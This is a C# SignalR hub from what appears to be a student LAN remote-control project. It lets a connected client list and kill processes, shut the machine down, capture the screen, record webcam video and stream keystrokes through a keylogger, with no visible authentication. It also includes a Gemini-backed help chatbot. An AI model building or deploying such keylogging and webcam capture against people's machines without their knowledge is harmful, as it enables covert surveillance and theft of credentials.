using Microsoft.AspNetCore.SignalR;
using Server.Services;
using Server.helper;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Threading;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Configuration;

namespace Server.Hubs
{
    public class ControlHub : Hub
    {
        private readonly SystemService _systemService;
        private readonly WebcamService _webcamService;
        private readonly InputService _inputService;
        private readonly IHubContext<ControlHub> _hubContext;
        private readonly IConfiguration _configuration;

        public ControlHub(
            SystemService systemService, 
            WebcamService webcamService, 
            InputService inputService,
            IHubContext<ControlHub> hubContext,
            IConfiguration configuration)
        {
            _systemService = systemService;
            _webcamService = webcamService;
            _inputService = inputService;
            _hubContext = hubContext;
            _configuration = configuration;
        }

        // --- NHÓM 1: HỆ THỐNG (LIST, START, KILL, SHUTDOWN) ---

        public async Task GetProcessList(bool isAppOnly)
        {
            var list = _systemService.ListProcessOrApp(isAppOnly);
            // Gửi kết quả về cho người gọi (Caller)
            string json = JsonHelper.ToJson(list); // Giả sử bạn đã có JsonHelper
            await Clients.Caller.SendAsync("ReceiveProcessList", json);
        }

        public async Task StartProcess(string path)
        {
            bool result = _systemService.startProcessOrApp(path);
            await Clients.Caller.SendAsync("ReceiveStatus", "START", result, result ? "Đã gửi lệnh mở" : "Lỗi mở file");
        }

        public async Task KillProcess(int id)
        {
            bool result = _systemService.killProcessOrApp(id);
            await Clients.Caller.SendAsync("ReceiveStatus", "KILL", result, result ? "Đã diệt thành công" : "Không thể diệt");
        }

        public async Task ShutdownServer(bool isRestart)
        {
            // Lệnh này một đi không trở lại, không cần await kết quả quá lâu
            bool result = _systemService.shutdownOrRestart(isRestart);
            await Clients.Caller.SendAsync("ReceiveStatus", "POWER", result, "Đang thực hiện lệnh nguồn...");
        }

        // --- NHÓM 2: MÀN HÌNH & WEBCAM ---

        public async Task GetScreenshot()
        {
            byte[] image = _webcamService.captureScreen();
            // Gửi ảnh về Client
            await Clients.Caller.SendAsync("ReceiveImage", "SCREENSHOT", image);
        }

        // Lệnh: Mở Webcam -> Quay 3s -> Gửi về -> Giữ cam mở
        public async Task RequestWebcam()
        {
            // Gửi thông báo đang xử lý
            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đang quay video bằng chứng...");

            var cancelToken = new CancellationTokenSource(3000).Token; // Timeout an toàn 5s
            var frames = await _webcamService.RequestWebcamProof(10, cancelToken); // 10 FPS

            // Gửi từng frame hoặc gửi cả list (ở đây gửi từng frame cho mượt)
            foreach (var frame in frames)
            {
                await Clients.Caller.SendAsync("ReceiveImage", "WEBCAM_FRAME", frame);
                await Task.Delay(100); // Giả lập phát lại
            }
            
            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đã gửi xong bằng chứng.");
        }

        public async Task CloseWebcam()
        {
            _webcamService.closeWebcam();
            await Clients.Caller.SendAsync("ReceiveStatus", "WEBCAM", true, "Đã đóng Webcam.");
        }

        // --- NHÓM 3: KEYLOGGER (INPUT) ---

        public async Task StartKeyLogger()
        {
            string connectionId = Context.ConnectionId;
            
            // Bắt đầu lắng nghe và gửi từng phím về Client
            _inputService.StartKeyLogger(async (keyData) => 
            {
                // Lưu ý: Dùng _hubContext để gửi từ luồng background
                await _hubContext.Clients.Client(connectionId).SendAsync("ReceiveKeyLog", keyData);
            });

            await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", true, "Keylogger đã bắt đầu.");
        }

        public async Task StopKeyLogger()
        {
            _inputService.StopKeyLogger();
            await Clients.Caller.SendAsync("ReceiveStatus", "KEYLOG", false, "Keylogger đã dừng.");
        }


        public async Task ChatWithAi(string message)
        {
            string reply = "";
            
            string apiKey = _configuration["ApiKeys:GeminiApiKey"] ?? "";
            
            string projectInfo = @"
                Bạn là 'Snowman' (Người Tuyết) ⛄ - Trợ lý ảo vui tính trong đồ án 'Christmas LAN Remote'.
                Nhiệm vụ của bạn là hướng dẫn người dùng sử dụng phần mềm này. Hãy trả lời ngắn gọn, hài hước, đậm chất Giáng sinh (ho ho ho).
                
                THÔNG TIN VỀ ỨNG DỤNG NÀY:
                1. Mục đích: Điều khiển máy tính từ xa trong mạng LAN qua giao diện Web.
                2. Công nghệ: Server chạy C# (.NET 8), Client chạy Web (HTML/JS), giao tiếp qua SignalR (WebSocket).
                3. Các tính năng chính (Tab):
                   - Tab APP: Liệt kê các ứng dụng có cửa sổ. Có thể Start (Mở) hoặc Stop (Tắt).
                   - Tab PROCESS: Quản lý toàn bộ tiến trình hệ thống (kể cả chạy ngầm).
                   - Tab SCREEN: Chụp ảnh màn hình máy Server (Snapshot).
                   - Tab KEYLOG: Theo dõi bàn phím của máy Server theo thời gian thực.
                   - Tab WEBCAM: Mở Webcam, quay video 3 giây để làm bằng chứng, rồi gửi về Client.
                   - Tab POWER: Tắt máy (Shutdown) hoặc Khởi động lại (Restart).
                
                HƯỚNG DẪN KẾT NỐI:
                - Nhập IP của máy Server vào ô trên cùng bên phải.
                - Bấm nút 'Kết nối'. Nếu thành công, đèn sẽ chuyển xanh.
                
                LƯU Ý AN TOÀN:
                - Lệnh Shutdown/Restart và Kill Process rất nguy hiểm, hãy nhắc người dùng cẩn thận.
            ";

            if (!string.IsNullOrEmpty(apiKey))
            {
                try 
                {
                    string apiUrl = $"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={apiKey}";
                    
                        string finalPrompt = $"{projectInfo}\n\nCâu hỏi của người dùng: {message}";

                    var requestData = new
                    {
                        contents = new[] 
                        { 
                            new { parts = new[] { new { text = finalPrompt } } } 
                        }
                    };

                    using (var httpClient = new HttpClient())
                    {
                        var jsonContent = new StringContent(
                            JsonSerializer.Serialize(requestData), 
                            Encoding.UTF8, 
                            "application/json");
                        
                        var response = await httpClient.PostAsync(apiUrl, jsonContent);
                        
                        if (response.IsSuccessStatusCode)
                        {
                            var responseString = await response.Content.ReadAsStringAsync();
                            using (JsonDocument doc = JsonDocument.Parse(responseString))
                            {
                                try 
                                {
                                    reply = doc.RootElement.GetProperty("candidates")[0]
                                        .GetProperty("content").GetProperty("parts")[0]
                                        .GetProperty("text").GetString() ?? ""; 
                                }
                                catch { reply = "AI bị đóng băng rồi 🥶 (Lỗi parse)."; }
                            }
                        }
                    }
                }
                catch (Exception ex) { Console.WriteLine("Lỗi HTTP: " + ex.Message); }
            }

            // --- LOGIC DỰ PHÒNG (NẾU KHÔNG CÓ KEY) ---
            if (string.IsNullOrEmpty(reply))
            {
                string lower = message.ToLower();
                if (lower.Contains("dùng") || lower.Contains("hướng dẫn") || lower.Contains("cách"))
                    reply = "Ho ho ho! Để dùng app này, bạn nhập IP Server rồi bấm Kết nối nhé! Sau đó chọn các Tab chức năng bên dưới.";
                else if (lower.Contains("chào"))
                    reply = "Chào bạn! Mình là Snowman ⛄. Mình biết tất cả về đồ án này, hãy hỏi đi!";
                else
                    reply = $"Mình nhận được: '{message}'. (Hãy nhập API Key để mình thông minh hơn nhé!)";
            }

            await Clients.Caller.SendAsync("ReceiveChatMessage", reply);
        }
    }
}
